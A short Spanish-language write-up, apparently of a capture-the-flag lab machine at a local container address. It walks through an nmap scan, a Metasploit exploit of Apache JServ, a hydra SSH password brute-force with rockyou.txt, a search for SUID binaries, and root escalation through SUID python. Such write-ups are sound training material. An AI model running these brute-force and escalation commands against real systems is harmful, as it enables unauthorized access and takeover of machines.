Fecha: 05/09/2024

Comienzo usando nmap: 
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](imágenes/Pasted%20image%2020240905155705.png)

Compruebo las versiones usando `msfconsole` y encuentro que Apache Jserv tiene una vulnerabilidad:

![](imágenes/Pasted%20image%2020240905160937.png)

![](imágenes/Pasted%20image%2020240905161358.png)

Ejecuto `exploit` y, viendo el fichero de salida encuentro el mensaje "Welcome to Tomcat, Jerry ;)"

![](imágenes/Pasted%20image%2020240905161526.png)

Probaré a buscar una contraseña para "Jerry" para ssh: 
```bash
sudo hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 16 
```

![](imágenes/Pasted%20image%2020240905161829.png)
Me conecto y veo que no puedo usar el comando sudo, así que busco ficheros con el bit SUID activado:
![](imágenes/Pasted%20image%2020240905162313.png)

```
find / -perm -4000 -user root 2>/dev/null
```

![](imágenes/Pasted%20image%2020240905162549.png)
Puedo usar python, así que debería ser fácil escalar privilegios. https://gtfobins.github.io/gtfobins/python/#suid 
Creo el siguiente archivo python y lo ejecuto:

```python
import os

os.execl("/bin/bash", "sh", "-p")
```

![](imágenes/Pasted%20image%2020240905163309.png)
En otros writeups leo que se puede ejecutar también de la siguiente forma:
```bash
/usr/bin/python3.7 -c 'import os; os.execl("/bin/bash", "sh", "-p")'
``` 




